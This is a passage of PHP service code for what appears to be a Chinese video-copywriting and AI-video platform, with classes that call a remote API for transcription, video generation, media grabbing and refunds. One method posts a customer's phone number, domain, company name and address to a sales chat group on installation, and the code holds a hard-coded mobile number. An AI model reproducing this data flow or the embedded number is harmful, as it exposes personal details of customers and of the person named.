        if (!$this->validateWebhookToken($domain, $timestamp, $token)) {
            return 'Invalid Token or Expired';
        }

        // 2. 获取域名信息
        $domainInfoJson = $this->getDomainInfo($domain);
        $domainInfo = json_decode($domainInfoJson, true);

        $wecomeData = [];
        if ($domainInfo && isset($domainInfo['showapi_res_code']) && $domainInfo['showapi_res_code'] === 0) {
            $wecomeData['domainInfo'] = $domainInfo['showapi_res_body']['obj'] ?? [];
            $wecomeData['mobile'] = $mobile;

            // 3. 执行 Webhook 消息推送
            return $this->sendWecomeWebhook($wecomeData);
        }

        return 'Failed to get domain info or invalid response';
    }

    // getDomainInfo 获取域名信息
    // @param string $domain 域名
    private function getDomainInfo($domain): string
    {
        if (empty($domain)) {
            return '';
        }

        $client = new Client();
        $response = $client->request('GET', self::ALIYUN_DOAMIN_INFO_URL, [
            'query' => [
                'domain' => $domain
            ],
            'headers' => [
                'Content-type' => "application/x-www-form-urlencoded",
                'Authorization' => self::TOKEN,
            ]
        ]);

        return $response->getBody()->getContents();
    }

    // sendWecomeWebhook 向企微客资群发送系统安装信息
    // @param array $data 数据
    private function sendWecomeWebhook($data): string
    {
        if (empty($data)) {
            return '';
        }

        $data['domainInfo']['address'] = $data['domainInfo']['address'] ?: '无';
        $installTime = date('Y-m-d H:i:s');
        $wecomData = [
            'msgtype' => 'text',
            'text' => [
                'content' => "客户手机：{$data['mobile']}\n域名：{$data['domainInfo']['domain']}\n企业名称：{$data['domainInfo']['com_name']}\n地址：{$data['domainInfo']['address']}\n安装时间：{$installTime}",
                "mentioned_mobile_list" => ["13049399540"]
            ]
        ];
        $client = new Client();
        $response = $client->request('POST', self::WECHAT_WORK_NOTIFY_URL, [
            'json' => $wecomData
        ]);

        return $response->getBody()->getContents();
    }
}

/**
 * 文案提取仿写等服务
 */
class CopywritingService
{
    /**
     * 视频仿写解析与生成 (调用远程API)
     * @param array $requestParams
     * @return array|bool
     * @throws \Exception
     */
    public function videoImitation(array $requestParams)
    {
        // 调用远程平台接口
        $response = app(ToolsService::class)
            ->setApiUrl('/api/copywriting/video2text')
            ->setRequest($requestParams)
            ->setMethod('POST')
            ->send()
            ->response;

        return $response;
    }
}

/**
 * 视频复刻（仿写）调用第三方服务
 */
class VideoImitationService
{
    /**
     * @desc 根据视频链接提取视频文案（兼容旧调用，统一走 V2 阿里云百炼）
     * @param string $videoUrl 视频链接（分享链接）
     * @return array
     */
    public function video2text(string $videoUrl): array
    {
        return $this->video2textV2($videoUrl);
    }

    /**
     * @desc 根据视频链接提取视频文案（V2 阿里云百炼）
     * @param string $videoUrl 视频链接（分享链接）
     * @return array
     */
    public function video2textV2(string $videoUrl): array
    {
        return $this->requestVideo2text($videoUrl, '/api/v2/videoImitation/video2text');
    }

    /**
     * 统一视频文案提取请求，避免 V1/V2 请求协议出现差异。
     */
    private function requestVideo2text(string $videoUrl, string $apiUrl): array
    {
        $params['shareUrl'] = $videoUrl;

        return app(ToolsService::class)
            ->setApiUrl($apiUrl)
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }

    /**
     * 语音转文字
     * @param string $audioUrl 语音文件链接
     * @return array
     */
    public function speech2Text(string $audioUrl): array
    {
        $params['action'] = 'stt';
        $params['audio_url'] = $audioUrl;

        return app(ToolsService::class)
            ->setApiUrl('/api/v2/ll/chat')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }

    /**
     * 发起使用形象生成视频的请求
     * @param array $requestParams
     * @return array|bool
     */
    public function virtualmanBroadcast(array $requestParams)
    {
        // 调用远程开放平台接口
        return app(ToolsService::class)
            ->setApiUrl('/api/shanjian/virtualman_broadcast')
            ->setRequestAndNotifyUrl($requestParams, '/api/videoImitation.task/notify', ['user_id' => $requestParams['user_id'], 'task_id' => $requestParams['task_id']])
            ->setMethod('POST')
            ->send()
            ->response;
    }

    /**
     * 发起使用素材生成视频的请求
     * @param array $requestParams
     * @return array|bool
     */
    public function mixcutBroadcast(array $requestParams)
    {
        // 调用远程开放平台接口
        return app(ToolsService::class)
            ->setApiUrl('/api/shanjian/mixcut_broadcast')
            ->setRequestAndNotifyUrl($requestParams, '/api/videoImitation.task/notify', ['user_id' => $requestParams['user_id'], 'task_id' => $requestParams['task_id']])
            ->setMethod('POST')
            ->send()
            ->response;
    }

    /**
     *  新闻体视频剪辑
     * @param array $requestParams
     * @return array
     */
    public function newsMixcut(array $requestParams): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/shanjian/news_mixcut')
            ->setMethod('POST')
            ->setRequestAndNotifyUrl($requestParams, '/api/videoImitation.task/notify', ['user_id' => $requestParams['user_id'], 'task_id' => $requestParams['task_id']])
            ->send()
            ->response;
    }
}


class GrabService
{
    /**
     * 抓取素材
     * @param array $requestParams
     * @return array|bool
     * @throws \Exception
     */
    public function image(array $requestParams)
    {
        // 调用远程平台接口
        $response = app(ToolsService::class)
            ->setApiUrl('/api/media/grab/image')
            ->setRequest($requestParams)
            ->setMethod('POST')
            ->send()
            ->response;

        return $response;
    }
    public function video(array $requestParams)
    {
        // 调用远程平台接口
        $response = app(ToolsService::class)
            ->setApiUrl('/api/media/grab/video')
            ->setRequest($requestParams)
            ->setMethod('POST')
            ->send()
            ->response;

        return $response;
    }

    /**
     * 图片抓取退费（通知中台 is_return）
     */
    public function refundImage(string $taskId, int $userId): array
    {
        return $this->refund('/api/media/grab/image', $taskId, $userId);
    }

    /**
     * 视频抓取退费（通知中台 is_return）
     */
    public function refundVideo(string $taskId, int $userId): array
    {
        return $this->refund('/api/media/grab/video', $taskId, $userId);
    }

    private function refund(string $apiUrl, string $taskId, int $userId): array
    {
        $response = app(ToolsService::class)
            ->setApiUrl($apiUrl)
            ->setRequest([
                'is_return' => 1,
                'task_id' => $taskId,
                'user_id' => $userId,
            ])
            ->setMethod('POST')
            ->sendWithoutThrow()
            ->response;

        return is_array($response) ? $response : [];
    }
}
